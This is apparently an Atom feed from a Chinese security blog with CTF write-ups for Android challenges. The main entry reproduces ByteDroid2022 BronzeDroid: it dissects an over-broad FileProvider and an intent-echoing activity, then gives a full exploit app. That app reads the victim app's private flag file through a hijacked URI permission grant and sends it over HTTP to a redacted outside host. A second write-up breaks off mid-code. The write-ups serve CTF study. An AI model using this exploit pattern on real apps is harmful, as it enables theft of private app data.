<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Matriy&#39;s blog</title>
  
  
  <link href="http://matriy330.github.io/atom.xml" rel="self"/>
  
  <link href="http://matriy330.github.io/"/>
  <updated>2026-01-27T03:30:25.653Z</updated>
  <id>http://matriy330.github.io/</id>
  
  <author>
    <name>Matriy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ByteDroid2022 BronzeDroid复现</title>
    <link href="http://matriy330.github.io/7f2da78c/"/>
    <id>http://matriy330.github.io/7f2da78c/</id>
    <published>2026-01-27T03:30:39.000Z</published>
    <updated>2026-01-27T03:30:25.653Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteDroid2022-BronzeDroid复现"><a href="#ByteDroid2022-BronzeDroid复现" class="headerlink" title="ByteDroid2022 BronzeDroid复现"></a>ByteDroid2022 BronzeDroid复现</h1><h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>FileProvider用来把 App 内部文件，用 <code>content://</code> 的方式安全地共享出去</p><blockquote><p>Android开始直接禁用file:&#x2F;&#x2F;共享</p></blockquote><p>而@xml&#x2F;file_path定义了可分享的范围:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;root-path&gt;</code> 的意思是：<strong>把设备文件系统的根目录 &#x2F;作为可共享的基准路径</strong></li><li><code>path=&quot;&quot;</code> 基本等价于：<strong>不做任何子目录限制</strong></li><li><code>name=&quot;root&quot;</code> 只是一个别名（后面构造 <code>content://</code> 路径时会用到）</li></ul><p>然后的一些InitializationProvider初始化了一些组件，在启动时，似乎跟题目没有关系，emohi2什么的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;32&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;12&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.bronzedroid&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;32&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;32&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.BronzeDroid&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.bronzedroid.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.bronzedroid.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.bytectf.bronzedroid.fileprovider&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span> <span class="attr">android:resource</span>=<span class="string">&quot;@xml/file_paths&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.startup.InitializationProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.bytectf.bronzedroid.androidx-startup&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.emoji2.text.EmojiCompatInitializer&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.lifecycle.ProcessLifecycleInitializer&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><p>如果action是ACTION_SHARET_TO_ME</p><p>就setResult-1,把启动时的intent原样返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.bronzedroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">        <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line">        <span class="keyword">if</span> (action != <span class="literal">null</span> &amp;&amp; action.equals(<span class="string">&quot;ACTION_SHARET_TO_ME&quot;</span>)) &#123;</span><br><span class="line">            setResult(-<span class="number">1</span>, getIntent());</span><br><span class="line">            finish();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="FlagReceiver"><a href="#FlagReceiver" class="headerlink" title="FlagReceiver"></a>FlagReceiver</h3><p>跟之前一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.bronzedroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">            writeFile(file, flag);</span><br><span class="line">            Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:7:0x0016 -&gt; B:23:0x0026). Please submit an issue!!! */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(File file, String s)</span> &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file, <span class="literal">true</span>);</span><br><span class="line">                    writer.write(s);</span><br><span class="line">                    writer.write(<span class="number">10</span>);</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                        writer.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e3) &#123;</span><br><span class="line">                    e3.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析及APP构建"><a href="#漏洞分析及APP构建" class="headerlink" title="漏洞分析及APP构建"></a>漏洞分析及APP构建</h2><p>跟BabyDroid原理一样，返回Intent时就可以带读写权限了</p><p>官方原话:</p><p>Call this to set the result that your activity will return to its caller.</p><p>As of Build.VERSION_CODES.GINGERBREAD, the Intent you supply here can have Intent.FLAG_GRANT_READ_URI_PERMISSION and&#x2F;or Intent.FLAG_GRANT_WRITE_URI_PERMISSION set. This will grant the Activity receiving the result access to the specific URIs in the Intent. Access will remain until the Activity has finished (it will remain across the hosting process being killed and other temporary destruction) and will be added to any existing set of URI permissions it already holds.</p><p>也就是说setResult 可以在原本intent设置 Intent.FLAG_GRANT_READ_URI_PERMISSION 和Intent.FLAG_GRANT_WRITE_URI_PERMISSION的情况下授予接收结果的 Activity 访问 Intent 中指定的 URI 的权限，权限将一直保持直到Activity结束(<strong>直到接收结果的 Activity 自己结束</strong>)。</p><p>MainActivity：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnbronzedroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.annotation.Nullable;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        EdgeToEdge.enable(<span class="built_in">this</span>);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(<span class="string">&quot;ACTION_SHARET_TO_ME&quot;</span>);</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.bronzedroid&quot;</span>, <span class="string">&quot;com.bytectf.bronzedroid.MainActivity&quot;</span>);</span><br><span class="line">        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;content://com.bytectf.bronzedroid.fileprovider/root/data/data/com.bytectf.bronzedroid/files/flag&quot;</span>));</span><br><span class="line">        startActivityForResult(intent,<span class="number">666</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onActivityResult</span><span class="params">(<span class="type">int</span> requestCode, <span class="type">int</span> resultCode, <span class="meta">@Nullable</span> Intent data)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            inputStream = getContentResolver().openInputStream(data.getData());</span><br><span class="line">            <span class="type">byte</span>[] flag = <span class="keyword">new</span> <span class="title class_">byte</span>[inputStream.available()];</span><br><span class="line">            inputStream.read(flag);</span><br><span class="line">            inputStream.close();</span><br><span class="line">            httpGet(<span class="keyword">new</span> <span class="title class_">String</span>(flag));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">httpGet</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://xxxxxxxxxxxx/?msg=&quot;</span> + msg);</span><br><span class="line">                    connection = (HttpURLConnection) url.openConnection();</span><br><span class="line">                    connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">                    connection.getInputStream();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260127112833829.png" alt="image-20260127112833829"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteDroid2022-BronzeDroid复现&quot;&gt;&lt;a href=&quot;#ByteDroid2022-BronzeDroid复现&quot; class=&quot;headerlink&quot; title=&quot;ByteDroid2022 BronzeDroid复现&quot;&gt;&lt;/a&gt;ByteD</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2021 ByteDroid2复现</title>
    <link href="http://matriy330.github.io/66e1f5f9/"/>
    <id>http://matriy330.github.io/66e1f5f9/</id>
    <published>2026-01-26T11:26:29.000Z</published>
    <updated>2026-01-26T11:27:06.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2021-ByteDroid2复现"><a href="#ByteCTF2021-ByteDroid2复现" class="headerlink" title="ByteCTF2021 ByteDroid2复现"></a>ByteCTF2021 ByteDroid2复现</h1><p>参考：<a href="https://my.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg#">ByteCTF2021 writeup for Android challenges - 飞书云文档</a></p><h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.bytedroid2&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.ByteDroid2&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.bytedroid2.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.bytedroid2.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.bytedroid2.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="FlagRecevier"><a href="#FlagRecevier" class="headerlink" title="FlagRecevier"></a>FlagRecevier</h3><p>还是收flag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 